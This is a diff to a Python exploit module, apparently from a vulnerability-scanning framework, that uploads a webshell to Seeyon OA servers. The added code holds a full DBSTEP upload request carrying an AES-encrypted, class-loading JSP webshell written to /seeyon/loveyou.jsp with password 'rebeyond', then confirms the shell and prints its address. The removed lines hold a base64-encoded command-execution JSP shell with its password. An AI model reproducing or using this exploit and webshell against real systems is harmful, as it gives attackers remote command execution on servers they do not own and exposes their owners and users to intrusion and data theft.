@@ -2,6 +2,7 @@
 
 from poc import core
 import base64
+import urllib.parse
 
 
 def check(url, attack):
@@ -24,20 +25,31 @@ def check(url, attack):
 
 def get_shell(url, path, name):
     print('\033[32m[#]开始写入webshell\033[0m')
-    payload = "REJTVEVQIFYzLjAgICAgIDM1NSAgICAgICAgICAgICAwICAgICAgICAgICAgICAgNjY2ICAgICAgICAgICAgIERCU1RFUD1PS01MbEtsVg0KT1BUSU9OPVMzV1lPU1dMQlNHcg0KY3VycmVudFVzZXJJZD16VUNUd2lnc3ppQ0FQTGVzdzRnc3c0b0V3VjY2DQpDUkVBVEVEQVRFPXdVZ2hQQjNzekIzWHdnNjYNClJFQ09SRElEPXFMU0d3NFNYekxlR3c0VjN3VXczelVvWHdpZDYNCm9yaWdpbmFsRmlsZUlkPXdWNjYNCm9yaWdpbmFsQ3JlYXRlRGF0ZT13VWdoUEIzc3pCM1h3ZzY2DQpGSUxFTkFNRT1xZlRkcWZUZHFmVGRWYXhKZUFKUUJSbDNkRXhReVlPZE5BbGZlYXhzZEdoaXlZbFRjQVRkTjFsaU40S1h3aVZHemZUMmRFZzYNCm5lZWRSZWFkRmlsZT15UldaZEFTNg0Kb3JpZ2luYWxDcmVhdGVEYXRlPXdMU0dQNG9FekxLQXo0PWl6PTY2DQo8JUAgcGFnZSBsYW5ndWFnZT0iamF2YSIgaW1wb3J0PSJqYXZhLnV0aWwuKixqYXZhLmlvLioiIHBhZ2VFbmNvZGluZz0iVVRGLTgiJT48JSFwdWJsaWMgc3RhdGljIFN0cmluZyBleGN1dGVDbWQoU3RyaW5nIGMpIHtTdHJpbmdCdWlsZGVyIGxpbmUgPSBuZXcgU3RyaW5nQnVpbGRlcigpO3RyeSB7UHJvY2VzcyBwcm8gPSBSdW50aW1lLmdldFJ1bnRpbWUoKS5leGVjKGMpO0J1ZmZlcmVkUmVhZGVyIGJ1ZiA9IG5ldyBCdWZmZXJlZFJlYWRlcihuZXcgSW5wdXRTdHJlYW1SZWFkZXIocHJvLmdldElucHV0U3RyZWFtKCkpKTtTdHJpbmcgdGVtcCA9IG51bGw7d2hpbGUgKCh0ZW1wID0gYnVmLnJlYWRMaW5lKCkpICE9IG51bGwpIHtsaW5lLmFwcGVuZCh0ZW1wKyJcbiIpO31idWYuY2xvc2UoKTt9IGNhdGNoIChFeGNlcHRpb24gZSkge2xpbmUuYXBwZW5kKGUuZ2V0TWVzc2FnZSgpKTt9cmV0dXJuIGxpbmUudG9TdHJpbmcoKTt9ICU+PCVpZigiYXNhc2QzMzQ0NSIuZXF1YWxzKHJlcXVlc3QuZ2V0UGFyYW1ldGVyKCJwd2QiKSkmJiEiIi5lcXVhbHMocmVxdWVzdC5nZXRQYXJhbWV0ZXIoImNtZCIpKSl7b3V0LnByaW50bG4oIjxwcmU+IitleGN1dGVDbWQocmVxdWVzdC5nZXRQYXJhbWV0ZXIoImNtZCIpKSArICI8L3ByZT4iKTt9ZWxzZXtvdXQucHJpbnRsbigiOi0pIik7fSU+NmU0ZjA0NWQ0Yjg1MDZiZjQ5MmFkYTdlMzM5MGQ3Y2U="
-    data = base64.b64decode(payload)
+    payload = ("\n"
+           "DBSTEP V3.0     400             0               1392             DBSTEP=OKMLlKlV\r\n"
+           "OPTION=S3WYOSWLBSGr\r\n"
+           "currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66\r\n"
+           "CREATEDATE=wUghPB3szB3Xwg66\r\n"
+           "RECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6\r\n"
+           "originalFileId=wV66\r\n"
+           "originalCreateDate=wUghPB3szB3Xwg66\r\n"
+           "FILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdc1DAyaQvNBT2dEg6\r\n"
+           "needReadFile=yRWZdAS6\r\n"
+           "originalCreateDate=wLSGP4oEzLKAz4=iz=66\r\n"
+           "////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////\r\n"
+           "<%@page import=\"java.util.*,javax.crypto.*,javax.crypto.spec.*\"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals(\"POST\")){String k=\"e45e329feb5d925b\";/*åÆ¥:Þ¥Æ32Mmd5<M16MØ¤Þ¥Ærebeyond*/session.putValue(\"u\",k);Cipher c=Cipher.getInstance(\"AES\");c.init(2,new SecretKeySpec(k.getBytes(),\"AES\"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>testtesttesttesttesttesttesttesttesttesttes\n")
     header = {
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
         "Content-Type": "application/x-www-form-urlencoded"
     }
-    r = core.post(url, path, header, data)
+    r = core.post(url, path, header, payload)
     if r:
-        r = core.get(url, '/seeyon/test123456.jsp?pwd=asasd33445&cmd=cmd+/c+echo+666')
+        r = core.get(url, '/seeyon/loveyou.jsp')
         if r:
-            if '666' in r.text:
+            if "testtest" in r.text:
                 print('\033[32m[#]成功写入webshell\033[0m')
-                core.end_echo(name, 'webshell地址：' + url + '/seeyon/test123456.jsp?pwd=asasd33445&cmd=cmd+/c+echo+666')
-                core.result(name, url + '/seeyon/test123456.jsp?pwd=asasd33445&cmd=cmd+/c+echo+666')
+                core.end_echo(name, 'webshell地址：' + url + '/seeyon/loveyou.jsp' + '密码：rebeyond')
+                core.result(name, url + '/seeyon/loveyou.jsp' + '密码：rebeyond')
             else:
                 print('\033[32m[#]写入webshell失败\033[0m')
                 core.end_echo(name)
